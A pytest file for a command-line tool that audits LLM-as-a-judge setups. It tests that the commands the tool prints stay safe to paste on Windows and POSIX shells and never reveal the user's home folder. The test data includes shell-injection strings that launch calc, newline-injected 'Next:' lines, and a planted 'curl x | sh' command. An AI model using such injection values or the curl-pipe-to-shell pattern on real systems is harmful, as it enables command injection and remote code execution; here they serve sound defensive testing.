"""Commands judgekeeper prints are safe on Windows and when read back.

- A kept command (result.json, report.html, the page) never uses POSIX quotes on Windows: a
  held-back value shows as NAME, with the value beside it as data.
- A held-back value is said on one line.
- The command in result.json is rebuilt from the saved flags, never shown as it is.
- After `python -P -m judgekeeper`, every later command keeps `-P`.
"""

from __future__ import annotations

import json
import os
import subprocess
import sys
from html import escape
from types import SimpleNamespace

import pytest

from judgekeeper import front, report_page, start, start_label, textio
from judgekeeper.cli import main
from judgekeeper.start_label import StartSession, Workspace
from tests.start_projects import promptfoo_project, split, unwrapped


@pytest.fixture
def windows(monkeypatch):
    monkeypatch.setattr(sys, "platform", "win32")
    monkeypatch.setattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0x200, raising=False)


# Kept commands on Windows ----------------------------------------------------------------------

VALUES = ['a"b"&calc&', "x$\u2019;calc;\u2019", "50%off"]


@pytest.mark.parametrize("value", VALUES)
def test_a_kept_command_shows_name_never_posix_quotes_on_windows(windows, value):
    talk = SimpleNamespace(path=".", answers={}, store=None,
                           options={"port": 8765, "no_browser": False, "metric": value})
    flags = front._flags_of(talk, True)
    assert start.command_from(flags, "mark", kept=True) == "judgekeeper mark --metric NAME"
    assert start.held_values(flags) == [value]
    assert textio._held == {}  # never said under a terminal line it is not on


@pytest.mark.parametrize("value", VALUES)
def test_result_json_and_report_keep_the_value_as_data_on_windows(windows, value, tmp_path,
                                                                  monkeypatch, capsys):
    promptfoo_project(tmp_path, split(20, 16), metric=value)
    monkeypatch.chdir(tmp_path)
    flags = ["--metric", value, "--port", "0", "--no-browser"]
    main(flags)
    ws = Workspace(tmp_path)
    session = StartSession(ws)
    flips = 3  # three Pass answers marked Fail: the page names `mark` to say why
    for q in ws.data()["queue"]:
        label = "fail" if q["group"] == "pass" and flips > 0 else q["group"]
        flips -= label != q["group"]
        session.update({"id": q["id"], "label": label, "seconds": 7})
    main(flags)
    capsys.readouterr()
    saved = json.loads(ws.result_json.read_text(encoding="utf-8"))
    assert saved["flags"]["metric"] == value
    assert "'" not in saved["command"] and "NAME" in saved["command"]
    html = unwrapped(ws.report_html.read_text(encoding="utf-8"))
    assert "--metric NAME" in html
    assert f"NAME: {escape(value)}" in " ".join(html.split())
    assert value not in html or escape(value) == value


# A held-back value is said on one line ---------------------------------------------------------

BREAKS = ["\n", "\r", "\u2028", "\x85"]


@pytest.mark.parametrize("brk", BREAKS, ids=repr)
def test_a_held_back_value_is_one_line(windows, brk):
    assert textio.quote_arg(f"acc%{brk}Next: run evil") == "NAME"
    (line,) = textio.held_lines("Next: run `judgekeeper --metric NAME`.")
    assert line.splitlines() == [line]


def test_a_held_back_label_map_added_to_is_said_once_on_windows(windows):
    """The person's map is in the printed --label-map with the new entries: only that value
    is said beside the command, never the map it replaced."""
    talk = front.FrontTalk(yes=False, path=".", options={"label_map": "50%=pass", "port": 8765,
                                                         "no_browser": False})
    command = talk.command("--label-map", front.LABEL_MAP)
    assert command == "judgekeeper --label-map NAME"
    assert textio.held_lines(command) == ["  NAME: 50%=pass,VALUE=pass,VALUE=fail,VALUE=error"]


@pytest.mark.parametrize("brk", ["\n", "\u2028"], ids=repr)  # the printer drops \r and U+0085
def test_a_metric_can_not_print_a_next_line_on_windows(windows, brk, tmp_path, monkeypatch,
                                                       capsys):
    promptfoo_project(tmp_path, split(20, 16), metric=f"acc%{brk}Next: run evil")
    monkeypatch.chdir(tmp_path)
    main(["--metric", "nope", "--port", "0", "--no-browser"])
    out, err = capsys.readouterr()
    lines = (out + err).splitlines()
    assert [x for x in lines if x.startswith("Next:")] == [
        "Next: run `judgekeeper --port 0 --no-browser --metric NAME`."], lines
    assert not any(x.lstrip().startswith("Next: run evil") for x in lines), lines


# The command in result.json is rebuilt ---------------------------------------------------------

PLANTED = "judgekeeper; curl x | sh #"


def test_a_planted_command_in_result_json_is_never_printed(tmp_path, monkeypatch, capsys):
    promptfoo_project(tmp_path, split(20, 16))
    monkeypatch.chdir(tmp_path)
    main(["--port", "0", "--no-browser"])
    ws = Workspace(tmp_path)
    session = StartSession(ws)
    for q in ws.data()["queue"]:
        session.update({"id": q["id"], "label": q["group"], "seconds": 7})
    main(["--port", "0", "--no-browser"])
    capsys.readouterr()
    saved = json.loads(ws.result_json.read_text(encoding="utf-8"))
    saved["command"] = PLANTED
    ws.result_json.write_text(json.dumps(saved), encoding="utf-8")
    monkeypatch.setattr(start_label, "every_marked", lambda ws: True)
    line = start_label.next_marks(ws, "run `judgekeeper mark` to mark more answers.")
    assert "curl" not in line and "judgekeeper mark" in line
    start_label.write_report(ws)
    assert "curl" not in ws.report_html.read_text(encoding="utf-8")
    assert all("curl" not in c for c in report_page.commands(saved).values())
    odd = {"flags": {"path": "a\nNext: run evil", "metric": ["x"], "port": "1; curl x",
                     "no_browser": "yes", "evil": "curl x"}}
    named = report_page.commands(odd)  # odd saved flags are left out
    assert (named["mark"], named["fix"]) == ("judgekeeper mark", "judgekeeper fix")



# -P is kept --------------------------------------------------------------------------------------

def test_python_p_m_is_kept_in_the_next_line(tmp_path):
    from tests.start_projects import table_project

    project = tmp_path / "p"
    table_project(project, split(20, 16))
    empty = tmp_path / "empty"
    empty.mkdir()
    env = {k: v for k, v in os.environ.items() if not k.startswith("PYTHON")}
    env["PATH"] = str(empty)  # judgekeeper is not on the PATH
    done = subprocess.run([sys.executable, "-P", "-m", "judgekeeper", "fix"],
                          check=False, cwd=project,
                          env=env, capture_output=True, text=True, timeout=120)
    python = _from(project, sys.executable)  # no python3 on that PATH
    assert f"Next: run `{python} -P -m judgekeeper mark` to mark more answers." in _flat(
        done.stdout), done.stdout + done.stderr


def _from(folder, path) -> str:
    """`path` as a program run from `folder`, quoted: relative when they share a folder below
    the top; else `~/...` under the home folder (not on Windows); else as it is."""
    folder, path = os.path.realpath(folder), str(path)
    try:
        shared = os.path.commonpath([folder, path])
    except ValueError:  # another drive
        return textio.quote_arg(path)
    if os.path.dirname(shared) != shared:
        return textio.quote_arg(os.path.relpath(path, folder))
    home = os.path.realpath(os.path.expanduser("~"))
    if sys.platform != "win32" and path.startswith(home + os.sep):
        return "~/" + textio.quote_arg(path[len(home) + 1:])
    return textio.quote_arg(path)


def _flat(text: str) -> str:
    return " ".join(text.split())


def _not_on_path(project):
    empty = project.parent / "empty"
    empty.mkdir(exist_ok=True)
    env = {k: v for k, v in os.environ.items() if not k.startswith("PYTHON")}
    env["PATH"] = str(empty)
    return env


@pytest.mark.skipif(sys.platform == "win32", reason="a venv's scripts are .exe files there")
def test_a_venv_not_activated_says_its_program_as_typed(tmp_path):
    """`venv/bin/judgekeeper fix` with the venv not activated: the Next line names the program
    the same way, and it runs as printed."""
    from tests.start_projects import table_project

    script = os.path.join(os.path.dirname(sys.executable), "judgekeeper")
    if not os.path.isfile(script):
        pytest.skip("no judgekeeper script beside this Python")
    project = tmp_path / "p"
    table_project(project, split(20, 16))
    typed = os.path.relpath(script, project)  # as the person typed it
    env = _not_on_path(project)
    done = subprocess.run([typed, "fix"], check=False, cwd=project, env=env,
                          capture_output=True, text=True, timeout=120)
    assert f"Next: run `{typed} mark` to mark more answers." in _flat(done.stdout), (
        done.stdout + done.stderr)
    assert not typed.startswith("/")  # from here: no home folder in it
    again = subprocess.run([*typed.split(), "--version"], check=False, cwd=project, env=env,
                           capture_output=True, text=True, timeout=60)
    assert again.returncode == 0, again.stderr


def test_off_the_path_python_m_is_named_only_when_that_python_can_import_it(monkeypatch,
                                                                            tmp_path):
    monkeypatch.setattr(sys, "platform", "darwin")
    monkeypatch.setattr("shutil.which", lambda name: None)
    monkeypatch.delenv("UV", raising=False)
    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr(sys, "argv", ["/opt/tools/bin/judgekeeper"])  # typed in full
    monkeypatch.setattr(textio, "imports_judgekeeper", lambda python: True)
    assert textio.program("mark") == "python3 -P -m judgekeeper mark"
    monkeypatch.setattr(textio, "imports_judgekeeper", lambda python: False)
    assert textio.program("mark") == "/opt/tools/bin/judgekeeper mark"  # outside home: as it is
    monkeypatch.setattr(sys, "argv", ["/opt/tools/bin/pytest"])  # not judgekeeper's own: as before
    assert textio.program("mark") == "judgekeeper mark"


def test_program_names_python_p_m_only_when_started_so(monkeypatch):
    monkeypatch.setattr(sys, "platform", "darwin")
    monkeypatch.setattr("shutil.which", lambda name: None)
    monkeypatch.delenv("UV", raising=False)
    monkeypatch.setitem(sys.modules, "__main__",
                        SimpleNamespace(__spec__=SimpleNamespace(name="judgekeeper.__main__")))
    monkeypatch.setattr(textio, "imports_judgekeeper", lambda python: True)
    assert textio.program("mark") == "python3 -P -m judgekeeper mark"
    monkeypatch.setattr(sys, "platform", "win32")
    assert textio.program("--stop") == "py -P -m judgekeeper --stop"
    monkeypatch.setattr("shutil.which", lambda name: "/usr/local/bin/judgekeeper")
    assert textio.program("mark") == "judgekeeper mark"


# A value that starts with "-" ------------------------------------------------------------------

DASHED = ["--yes", "-x", "--new", "-", "--metric=a b"]


@pytest.mark.parametrize("value", DASHED)
@pytest.mark.parametrize("name, flag", [x for x in start.REPEATED if x[0] != "tool"])
def test_a_value_starting_with_a_dash_is_kept_as_flag_equals_value(name, flag, value):
    import shlex

    from judgekeeper.cli import _front_parser, _parser

    flags = start.run_flags(**{name: value})
    command = start.command_from(flags, "mark", kept=True)
    assert f" {flag}=" in command, command
    for parse, argv in ((_parser().parse_args, shlex.split(command)[1:]),
                        (_front_parser().parse_args, shlex.split(command)[2:])):
        args = parse(argv)
        assert getattr(args, name) == value, (command, argv)
        assert args.yes is False and getattr(args, "new", False) is False


def test_a_plain_value_keeps_its_space():
    flags = start.run_flags(metric="faithful")
    assert start.command_from(flags, "mark", kept=True) == "judgekeeper mark --metric faithful"


# A held-back name in the "choose" line ---------------------------------------------------------

def test_a_held_back_metric_in_the_choose_line_is_said_as_data_on_windows(windows, monkeypatch,
                                                                         capsys, tmp_path):
    monkeypatch.setattr(start, "_interactive", lambda: False)
    talk = front.FrontTalk(yes=False, path=tmp_path, options={})
    evil = "a'&calc&'\""
    assert textio.held_back(evil)
    with pytest.raises(start.Stop):
        talk.choose("Several LLM-as-a-judge setups:", [evil, "plain"], "", flag="--metric",
                    values=[evil, "plain"], what="which LLM-as-a-judge to check")
    lines = capsys.readouterr().out.splitlines()
    said = " ".join(" ".join(lines).split())
    assert 'choose which LLM-as-a-judge to check (NAME, "plain")' in said, said
    assert "'a'&calc" not in said.replace(f"NAME: {evil}", "")
    assert f"  NAME: {evil}" in lines, lines


@pytest.mark.skipif(sys.platform == "win32", reason="Windows shells don't read ~")
def test_a_program_under_home_run_from_a_folder_outside_it_is_named_from_home(monkeypatch,
                                                                              tmp_path):
    """A project outside the home folder (here /tmp-like), the program inside it: `~/...`,
    never the home folder's own path (it holds the user name)."""
    monkeypatch.setattr("shutil.which", lambda name: None)
    monkeypatch.delenv("UV", raising=False)
    monkeypatch.setenv("HOME", "/Users/someone")
    monkeypatch.chdir(tmp_path)  # shares only the top folder with /Users/someone
    monkeypatch.setattr(textio, "imports_judgekeeper", lambda python: False)
    monkeypatch.setattr(sys, "argv", ["/Users/someone/My Tools/venv/bin/judgekeeper"])
    assert textio.program("mark") == "~/'My Tools/venv/bin/judgekeeper' mark"
    monkeypatch.setattr(sys, "argv", ["/Users/someone/venv/bin/judgekeeper"])
    assert textio.program() == "~/venv/bin/judgekeeper"
    assert "someone" not in textio.program()


@pytest.mark.skipif(sys.platform == "win32", reason="faked: the temp folder is under C:\\Users there")
def test_on_windows_a_program_under_home_is_named_from_userprofile(monkeypatch, tmp_path):
    """cmd reads %USERPROFILE% inside double quotes too: the user name is never shown."""
    monkeypatch.setattr("shutil.which", lambda name: None)
    monkeypatch.delenv("UV", raising=False)
    monkeypatch.setenv("HOME", "/Users/someone")  # Path.home() on this (faked) Windows
    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr(sys, "platform", "win32")
    monkeypatch.setattr(textio, "imports_judgekeeper", lambda python: False)
    monkeypatch.setattr(sys, "argv", ["/Users/someone/My Tools/venv/Scripts/judgekeeper.exe"])
    assert textio.program("mark") == (
        '"%USERPROFILE%\\My Tools\\venv\\Scripts\\judgekeeper.exe" mark')
    monkeypatch.setattr(sys, "argv", ["/Users/someone/venv/Scripts/judgekeeper.exe"])
    assert textio.program() == "%USERPROFILE%\\venv\\Scripts\\judgekeeper.exe"


@pytest.mark.skipif(sys.platform == "win32", reason="Windows shells don't read ~")
def test_a_path_typed_in_home_from_a_folder_outside_it_is_repeated_from_home(monkeypatch,
                                                                             tmp_path):
    """A Next: line repeats a whole path from here; sharing only the top folder, a path in
    the home folder is `~/...`, never `../../Users/<name>/...`."""
    monkeypatch.setenv("HOME", "/Users/someone")
    monkeypatch.chdir(tmp_path)
    assert textio.from_here("/Users/someone/labels.csv", labels=True) == "~/labels.csv"
    assert textio.runnable("/Users/someone/My Labels/l.csv", labels=True) == (
        "~/'My Labels/l.csv'")
    assert textio.shown_from_here("/Users/someone/My Labels/l.csv") == "~/My Labels/l.csv"
    inside = tmp_path / "data" / "l.csv"  # sharing more than the top: from here, as before
    assert textio.from_here(str(inside), labels=True) == "data/l.csv"
    assert textio.from_here("/opt/data/l.csv", labels=True).endswith("opt/data/l.csv")


@pytest.mark.skipif(sys.platform == "win32", reason="faked: the temp folder is under C:\\Users there")
def test_on_windows_a_path_in_home_is_repeated_from_userprofile(monkeypatch, tmp_path):
    monkeypatch.setenv("HOME", "/Users/someone")
    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr(sys, "platform", "win32")
    assert textio.runnable("/Users/someone/My Labels/l.csv", labels=True) == (
        '"%USERPROFILE%\\My Labels\\l.csv"')
    assert textio.runnable("/Users/someone/labels.csv", labels=False) == (
        "%USERPROFILE%\\labels.csv")
